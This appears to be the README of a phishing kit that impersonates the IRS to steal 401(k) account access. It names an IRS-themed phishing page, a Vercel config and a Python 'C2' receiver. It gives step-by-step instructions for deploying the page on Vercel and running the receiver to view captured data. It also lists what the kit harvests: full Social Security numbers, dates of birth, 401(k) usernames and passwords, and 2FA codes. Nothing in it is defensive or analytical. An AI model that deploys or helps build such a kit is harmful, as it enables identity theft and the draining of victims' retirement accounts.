===============================================================
IRS 401(k) PHISHING OPERATION - FULL SSN VERSION
===============================================================

FILES IN THIS FOLDER:
---------------------
1. index.html    - IRS-themed phishing page (Full SSN)
2. vercel.json   - Vercel deployment config
3. receiver.py   - C2 server (run on your machine)

HOW TO DEPLOY:
--------------
1. Go to vercel.com and sign up (free)
2. Click "Add New Project"
3. Drag this ENTIRE folder into Vercel
4. Click "Deploy"
5. You'll get a URL like: https://your-project.vercel.app

HOW TO RUN RECEIVER:
--------------------
1. Open PowerShell or CMD in this folder
2. Run: pip install flask
3. Run: python receiver.py
4. Receiver runs on: http://localhost:8080
5. View captured data: http://localhost:8080/view

DATA CAPTURED:
--------------
- Full Name
- Email Address
- Phone Number
- Date of Birth
- FULL SSN (Step 1 & Step 2)
- 401(k) Provider
- 401(k) Username
- 401(k) Password
- 2FA Code

===============================================================
